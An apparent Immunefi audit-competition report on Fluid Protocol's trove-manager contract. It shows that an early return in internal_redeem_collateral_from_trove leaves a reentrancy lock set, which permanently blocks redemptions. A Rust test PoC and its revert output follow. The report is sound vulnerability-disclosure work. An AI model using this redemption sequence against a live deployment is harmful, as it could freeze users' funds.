# #37452 \[SC-Critical] \`trove-manager-contract.redeem\_collateral\_from\_trove\` can be locked forever

**Submitted on Dec 5th 2024 at 04:07:57 UTC by @jasonxiale for** [**IOP | Fluid Protocol**](https://immunefi.com/audit-competition/iop-fluid-protocol)

* **Report ID:** #37452
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/Hydrogen-Labs/fluid-protocol/tree/main/contracts/trove-manager-contract/src/main.sw>
* **Impacts:**
  * Permanent freezing of funds

## Description

## Brief/Intro

`trove-manager-contract.redeem_collateral_from_trove` is used to redeem USDF for other collaterals, in current implementation, there is an early return that doesn' set the `lock` variable to `false`, leading `trove-manager-contract.redeem_collateral_from_trove` to be DOSed forever.

## Vulnerability Details

`trove-manager-contract.redeem_collateral_from_trove` will call [trove-manager-contract.internal\_redeem\_collateral\_from\_trove](https://github.com/Hydrogen-Labs/fluid-protocol/blob/78ab7bdd243b414b424fca6e1eb144218f36a18a/contracts/trove-manager-contract/src/main.sw#L780-L850), in `trove-manager-contract.internal_redeem_collateral_from_trove`, to prevent reentrancy, the function will first make sure `lock_internal_redeem_collateral_from_trove` isn't set, and then set the variable in [trove-manager-contract#L789-L797](https://github.com/Hydrogen-Labs/fluid-protocol/blob/78ab7bdd243b414b424fca6e1eb144218f36a18a/contracts/trove-manager-contract/src/main.sw#L789-L797).

If `lock_internal_redeem_collateral_from_trove` has already been set, the function will revert with msg `"TroveManager: Internal redeem collateral from trove is locked"`.

Then at the end of the function, `lock_internal_redeem_collateral_from_trove` will be cleared.

**The issue is that there is an early return in** [**trove-manager-contract#L819-L822**](https://github.com/Hydrogen-Labs/fluid-protocol/blob/78ab7bdd243b414b424fca6e1eb144218f36a18a/contracts/trove-manager-contract/src/main.sw#L819-L822)**, and before the `return`, `lock_internal_redeem_collateral_from_trove` isn't cleared**

```rust
780 fn internal_redeem_collateral_from_trove(
781     borrower: Identity,
782     max_usdf_amount: u64,
783     price: u64,
784     partial_redemption_hint: u64,
785     upper_partial_hint: Identity,
786     lower_partial_hint: Identity,
787 ) -> SingleRedemptionValues {
788     // Prevent reentrancy
789     require(
790         storage
791             .lock_internal_redeem_collateral_from_trove
792             .read() == false,
793         "TroveManager: Internal redeem collateral from trove is locked",
794     );
795     storage
796         .lock_internal_redeem_collateral_from_trove
797         .write(true);
...
815     } else {
816         // Calculate the new nominal collateralization ratio
817         let new_nicr = fm_compute_nominal_cr(new_coll, new_debt);
818         // If the new debt is below the minimum allowed, cancel the partial redemption
819         if (new_debt < MIN_NET_DEBT) {
820             single_redemption_values.cancelled_partial = true; 

----------->>>>>>>> Here the function does't clear `lock_internal_redeem_collateral_from_trove`
821             return single_redemption_values; 
822         }
...
850 }
```

## Impact Details

If the early return happens, the `redeem_collateral_from_trove` will be DOSed forever.

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

Please put the following code in `contracts/protocol-manager-contract/tests/success_redemptions.rs` and run

```bash
cargo test proper_redemption_from_partially_closed_dos -- --nocapture

...

running 0 tests

test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 1 filtered out; finished in 0.00s

     Running tests/success_redemptions.rs (/opt/work/fluid-protocol/target/debug/deps/success_redemptions-a2d6c1cfcebe8b03)

running 1 test
Deploying core contracts...
Initializing core contracts...
LogResult { results: [Ok("TotalSupplyEvent { asset: 1d5cc792df542423f89a4fe22ccab41249fb9a5a6ffe2e64cdcfbc930af5f34b, supply: 15075000000000, sender: ContractId(9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba) }")] }
0
====================================================
thread 'proper_redemption_from_partially_closed_dos' panicked at /opt/work/fluid-protocol/test-utils/src/interfaces/protocol_manager.rs:214:14:
called `Result::unwrap()` on an `Err` value: Transaction(Reverted { reason: "AsciiString { data: \"TroveManager: Internal redeem collateral from trove is locked\" }", revert_id: 18446744073709486080, receipts: [Call { id: 0000000000000000000000000000000000000000000000000000000000000000, to: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, amount: 3000000000000, asset_id: 1d5cc792df542423f89a4fe22ccab41249fb9a5a6ffe2e64cdcfbc930af5f34b, gas: 1999782, param1: 10480, param2: 10505, pc: 19008, is: 19008 }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: 31ddeab4ed2802e357f2470401e3137f9f532b81c5751b6ab62ee556afc0ee19, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1980431, param1: 67101824, param2: 67100800, pc: 139672, is: 139672 }, Call { id: 31ddeab4ed2802e357f2470401e3137f9f532b81c5751b6ab62ee556afc0ee19, to: efdc766a03161cdbbe2a674ffa4562736f3bde2effc04badbafc3b2f5277370b, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1976461, param1: 67098176, param2: 67097152, pc: 189921, is: 189921 }, ReturnData { id: efdc766a03161cdbbe2a674ffa4562736f3bde2effc04badbafc3b2f5277370b, ptr: 67094592, len: 28, digest: a9dd65fcff83b6bccf652da94d61edd8632ff002061afc77e498266005f6be0c, pc: 191957, is: 189921, data: Some(00000000000000000000000900...) }, ReturnData { id: 31ddeab4ed2802e357f2470401e3137f9f532b81c5751b6ab62ee556afc0ee19, ptr: 67092800, len: 8, digest: 59f603c39018dc65fbf3007d91985355b0e27df2993aab3c4a9e4b5ea36c5996, pc: 156956, is: 139672, data: Some(000000003b9aca00) }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: ad5c644c9b8714c5b137d8e9dfbb3b3be82b80bb698462a42ebe4786f56cf416, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1970352, param1: 67091520, param2: 67090496, pc: 139112, is: 139112 }, ReturnData { id: ad5c644c9b8714c5b137d8e9dfbb3b3be82b80bb698462a42ebe4786f56cf416, ptr: 67087104, len: 40, digest: ea74a1155359165b175e6b127fa7c4c341aaa1179234bfc620e5c43fa2bc1969, pc: 160104, is: 139112, data: Some(00000000000000005d99ee966b...) }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1962703, param1: 67086080, param2: 67085056, pc: 139912, is: 139912 }, ReturnData { id: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, ptr: 67079921, len: 8, digest: a288e93d8a680ea89431f8e7d03e6e9ee4a4c7df535f475fdd41bd8da7b84093, pc: 170788, is: 139912, data: Some(000000005ee49978) }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1883621, param1: 67078889, param2: 67077865, pc: 139672, is: 139672 }, Call { id: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, to: 313afce0799387b2931a204eee923aaf437db22c64cf00a47c80b2ab7b13441c, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1877607, param1: 67074729, param2: 67073705, pc: 278312, is: 278312 }, ReturnData { id: 313afce0799387b2931a204eee923aaf437db22c64cf00a47c80b2ab7b13441c, ptr: 67070569, len: 8, digest: 2b381cc14c4a06f97d5bef7439eea186ea1de8b680eb1e8b561be8226cfefe06, pc: 298220, is: 278312, data: Some(00000db5ec051e00) }, Call { id: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, to: 9a1c90566e409e0da2d6d472cf52b220210cae70035fcadb9c6ddb01ba8a5d07, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1870769, param1: 67069289, param2: 67068265, pc: 278312, is: 278312 }, ReturnData { id: 9a1c90566e409e0da2d6d472cf52b220210cae70035fcadb9c6ddb01ba8a5d07, ptr: 67065129, len: 8, digest: af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc, pc: 295772, is: 278312, data: Some(0000000000000000) }, ReturnData { id: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, ptr: 67064105, len: 8, digest: 2b381cc14c4a06f97d5bef7439eea186ea1de8b680eb1e8b561be8226cfefe06, pc: 169468, is: 139672, data: Some(00000db5ec051e00) }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: 5e1d234330d8b193927286c68a86d04d5d01d5126691c54af110ead6c40d9708, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1863045, param1: 67062969, param2: 67061945, pc: 139672, is: 139672 }, Call { id: 5e1d234330d8b193927286c68a86d04d5d01d5126691c54af110ead6c40d9708, to: 880ce776d9cbc06eebabd32a59d1932af10a903ae200eda37861adcfc35c52a4, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1859075, param1: 67059321, param2: 67058297, pc: 189921, is: 189921 }, ReturnData { id: 880ce776d9cbc06eebabd32a59d1932af10a903ae200eda37861adcfc35c52a4, ptr: 67055737, len: 28, digest: a9dd65fcff83b6bccf652da94d61edd8632ff002061afc77e498266005f6be0c, pc: 191957, is: 189921, data: Some(00000000000000000000000900...) }, ReturnData { id: 5e1d234330d8b193927286c68a86d04d5d01d5126691c54af110ead6c40d9708, ptr: 67053945, len: 8, digest: 59f603c39018dc65fbf3007d91985355b0e27df2993aab3c4a9e4b5ea36c5996, pc: 156956, is: 139672, data: Some(000000003b9aca00) }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: ad5c644c9b8714c5b137d8e9dfbb3b3be82b80bb698462a42ebe4786f56cf416, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1852966, param1: 67052665, param2: 67051641, pc: 139112, is: 139112 }, ReturnData { id: ad5c644c9b8714c5b137d8e9dfbb3b3be82b80bb698462a42ebe4786f56cf416, ptr: 67048249, len: 40, digest: 2c34ce1df23b838c5abf2a7f6437cca3d3067ed509ff25f11df6b11b582b51eb, pc: 160104, is: 139112, data: Some(00000000000000000000000000...) }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: f5b66678f7799d5740d461c5a3d3f18356e32530192ef2654af64bc046595ad0, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1845464, param1: 67047209, param2: 67046185, pc: 139672, is: 139672 }, Call { id: f5b66678f7799d5740d461c5a3d3f18356e32530192ef2654af64bc046595ad0, to: 313afce0799387b2931a204eee923aaf437db22c64cf00a47c80b2ab7b13441c, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1839450, param1: 67043049, param2: 67042025, pc: 278312, is: 278312 }, ReturnData { id: 313afce0799387b2931a204eee923aaf437db22c64cf00a47c80b2ab7b13441c, ptr: 67038889, len: 8, digest: af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc, pc: 298220, is: 278312, data: Some(0000000000000000) }, Call { id: f5b66678f7799d5740d461c5a3d3f18356e32530192ef2654af64bc046595ad0, to: 9a1c90566e409e0da2d6d472cf52b220210cae70035fcadb9c6ddb01ba8a5d07, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1832612, param1: 67037609, param2: 67036585, pc: 278312, is: 278312 }, ReturnData { id: 9a1c90566e409e0da2d6d472cf52b220210cae70035fcadb9c6ddb01ba8a5d07, ptr: 67033449, len: 8, digest: af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc, pc: 295772, is: 278312, data: Some(0000000000000000) }, ReturnData { id: f5b66678f7799d5740d461c5a3d3f18356e32530192ef2654af64bc046595ad0, ptr: 67032425, len: 8, digest: af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc, pc: 169468, is: 139672, data: Some(0000000000000000) }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: ad5c644c9b8714c5b137d8e9dfbb3b3be82b80bb698462a42ebe4786f56cf416, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1823043, param1: 67030921, param2: 67029897, pc: 140032, is: 140032 }, ReturnData { id: ad5c644c9b8714c5b137d8e9dfbb3b3be82b80bb698462a42ebe4786f56cf416, ptr: 67025922, len: 40, digest: 2e0cc4f65421eb00c527deb8171afd28931d36a7673d00ddbb7ccbfa672a70d4, pc: 160204, is: 140032, data: Some(0000000000000000bdaad6a89e...) }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1813741, param1: 67024898, param2: 67023874, pc: 139112, is: 139112 }, ReturnData { id: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, ptr: 0, len: 0, digest: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855, pc: 171456, is: 139112, data: Some() }, Call { id: 9f90ce48708b8ce30186a91a1f759ff541393f95143ef00cc38f974d5bea5cba, to: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1801640, param1: 67019064, param2: 67018040, pc: 139112, is: 139112 }, LogData { id: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, ra: 0, rb: 10098701174489624218, ptr: 67014904, len: 69, digest: 8aeae7cefa9c5fa1b1bbe5a4cc186b8d50ceeb77d742620c3c1206ea76775466, pc: 178880, is: 139112, data: Some(000000000000003d54726f7665...) }, Revert { id: cf0d07e5a97c56dc62d3fb6a096a881bbc9938d4021293ad855eb2087a9029b3, ra: 18446744073709486080, pc: 178888, is: 139112 }, ScriptResult { result: Revert, gas_used: 206236 }] })
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
test proper_redemption_from_partially_closed_dos ... FAILED

failures:

failures:
    proper_redemption_from_partially_closed_dos
```

In the POC, two redeem transactions are submited, the first is used to make `internal_redeem_collateral_from_trove` return early(which means `lock_internal_redeem_collateral_from_trove` isn't cleared`, and the second redeem transaction will revert with` "TroveManager: Internal redeem collateral from trove is locked"\`

```diff
diff --git a/contracts/protocol-manager-contract/tests/success_redemptions.rs b/contracts/protocol-manager-contract/tests/success_redemptions.rs
index 027834b..8899e51 100644
--- a/contracts/protocol-manager-contract/tests/success_redemptions.rs
+++ b/contracts/protocol-manager-contract/tests/success_redemptions.rs
@@ -518,3 +518,222 @@ async fn proper_redemption_with_a_trove_closed_fully() {
 
     assert_eq!(coll_surplus, coll3 - with_min_borrow_fee(debt3));
 }
+
+#[tokio::test]
+async fn proper_redemption_from_partially_closed_dos() {
+    let (contracts, _admin, mut wallets) = setup_protocol(5, true, false).await;
+
+    let healthy_wallet1 = wallets.pop().unwrap();
+    let healthy_wallet2 = wallets.pop().unwrap();
+    let healthy_wallet3 = wallets.pop().unwrap();
+
+    let balance = 10_000 * PRECISION;
+
+    token_abi::mint_to_id(
+        &contracts.asset_contracts[0].asset,
+        balance,
+        Identity::Address(healthy_wallet1.address().into()),
+    )
+    .await;
+
+    token_abi::mint_to_id(
+        &contracts.asset_contracts[0].asset,
+        balance,
+        Identity::Address(healthy_wallet2.address().into()),
+    )
+    .await;
+
+    token_abi::mint_to_id(
+        &contracts.asset_contracts[0].asset,
+        balance,
+        Identity::Address(healthy_wallet3.address().into()),
+    )
+    .await;
+
+    let borrow_operations_healthy_wallet1 = ContractInstance::new(
+        BorrowOperations::new(
+            contracts.borrow_operations.contract.contract_id().clone(),
+            healthy_wallet1.clone(),
+        ),
+        contracts.borrow_operations.implementation_id.clone(),
+    );
+
+    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[0].oracle, PYTH_TIMESTAMP).await;
+    pyth_oracle_abi::update_price_feeds(
+        &contracts.asset_contracts[0].mock_pyth_oracle,
+        pyth_price_feed(1),
+    )
+    .await;
+
+    borrow_operations_abi::open_trove(
+        &borrow_operations_healthy_wallet1,
+        &contracts.asset_contracts[0].oracle,
+        &contracts.asset_contracts[0].mock_pyth_oracle,
+        &contracts.asset_contracts[0].mock_redstone_oracle,
+        &contracts.asset_contracts[0].asset,
+        &contracts.usdf,
+        &contracts.fpt_staking,
+        &contracts.sorted_troves,
+        &contracts.asset_contracts[0].trove_manager,
+        &contracts.active_pool,
+        10_000 * PRECISION,
+        5_000 * PRECISION,
+        Identity::Address(Address::zeroed()),
+        Identity::Address(Address::zeroed()),
+    )
+    .await
+    .unwrap();
+
+    let borrow_operations_healthy_wallet2 = ContractInstance::new(
+        BorrowOperations::new(
+            contracts.borrow_operations.contract.contract_id().clone(),
+            healthy_wallet2.clone(),
+        ),
+        contracts.borrow_operations.implementation_id.clone(),
+    );
+
+    borrow_operations_abi::open_trove(
+        &borrow_operations_healthy_wallet2,
+        &contracts.asset_contracts[0].oracle,
+        &contracts.asset_contracts[0].mock_pyth_oracle,
+        &contracts.asset_contracts[0].mock_redstone_oracle,
+        &contracts.asset_contracts[0].asset,
+        &contracts.usdf,
+        &contracts.fpt_staking,
+        &contracts.sorted_troves,
+        &contracts.asset_contracts[0].trove_manager,
+        &contracts.active_pool,
+        9_000 * PRECISION,
+        5_000 * PRECISION,
+        Identity::Address(Address::zeroed()),
+        Identity::Address(Address::zeroed()),
+    )
+    .await
+    .unwrap();
+
+    let borrow_operations_healthy_wallet3 = ContractInstance::new(
+        BorrowOperations::new(
+            contracts.borrow_operations.contract.contract_id().clone(),
+            healthy_wallet3.clone(),
+        ),
+        contracts.borrow_operations.implementation_id.clone(),
+    );
+
+    borrow_operations_abi::open_trove(
+        &borrow_operations_healthy_wallet3,
+        &contracts.asset_contracts[0].oracle,
+        &contracts.asset_contracts[0].mock_pyth_oracle,
+        &contracts.asset_contracts[0].mock_redstone_oracle,
+        &contracts.asset_contracts[0].asset,
+        &contracts.usdf,
+        &contracts.fpt_staking,
+        &contracts.sorted_troves,
+        &contracts.asset_contracts[0].trove_manager,
+        &contracts.active_pool,
+        8_000 * PRECISION,
+        5_000 * PRECISION,
+        Identity::Address(Address::zeroed()),
+        Identity::Address(Address::zeroed()),
+    )
+    .await
+    .unwrap();
+
+    let protocol_manager_health1 = ContractInstance::new(
+        ProtocolManager::new(
+            contracts.protocol_manager.contract.contract_id().clone(),
+            healthy_wallet1.clone(),
+        ),
+        contracts.protocol_manager.implementation_id,
+    );
+
+    let pre_redemption_active_pool_debt = active_pool_abi::get_usdf_debt(
+        &contracts.active_pool,
+        contracts.asset_contracts[0].asset_id,
+    )
+    .await
+    .value;
+
+    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[1].oracle, PYTH_TIMESTAMP).await;
+    pyth_oracle_abi::update_price_feeds(
+        &contracts.asset_contracts[1].mock_pyth_oracle,
+        pyth_price_feed(1),
+    )
+    .await;
+
+    let redemption_amount: u64 = 4_800 * PRECISION;
+    let res = protocol_manager_abi::redeem_collateral(
+        &protocol_manager_health1,
+        redemption_amount,
+        10,
+        0,
+        None,
+        None,
+        &contracts.usdf,
+        &contracts.fpt_staking,
+        &contracts.coll_surplus_pool,
+        &contracts.default_pool,
+        &contracts.active_pool,
+        &contracts.sorted_troves,
+        &contracts.asset_contracts,
+    )
+    .await;
+
+    let logs = res.decode_logs();
+    println!("{:?}", logs);
+    print_response(&res);
+    println!("====================================================");
+
+
+    let redemption_amount: u64 = 3_000 * PRECISION;
+    let res = protocol_manager_abi::redeem_collateral(
+        &protocol_manager_health1,
+        redemption_amount,
+        10,
+        0,
+        None,
+        None,
+        &contracts.usdf,
+        &contracts.fpt_staking,
+        &contracts.coll_surplus_pool,
+        &contracts.default_pool,
+        &contracts.active_pool,
+        &contracts.sorted_troves,
+        &contracts.asset_contracts,
+    )
+    .await;
+
+    let logs = res.decode_logs();
+    println!("{:?}", logs);
+    print_response(&res);
+
+
+/*    
+    let active_pool_asset = active_pool_abi::get_asset(
+        &contracts.active_pool,
+        contracts.asset_contracts[0].asset_id,
+    )
+    .await
+    .value;
+
+    let active_pool_debt = active_pool_abi::get_usdf_debt(
+        &contracts.active_pool,
+        contracts.asset_contracts[0].asset_id,
+    )
+    .await
+    .value;
+
+    println!("active_pool_asset: {}", active_pool_asset);
+    println!("active_pool_debt: {}", active_pool_debt);
+    println!(
+        "pre_redemption_active_pool_debt: {}",
+        pre_redemption_active_pool_debt
+    );
+    println!("redemption_amount: {}", redemption_amount);
+
+    assert_eq!(
+        active_pool_debt,
+        pre_redemption_active_pool_debt - redemption_amount
+    );
+*/
+}
+
```
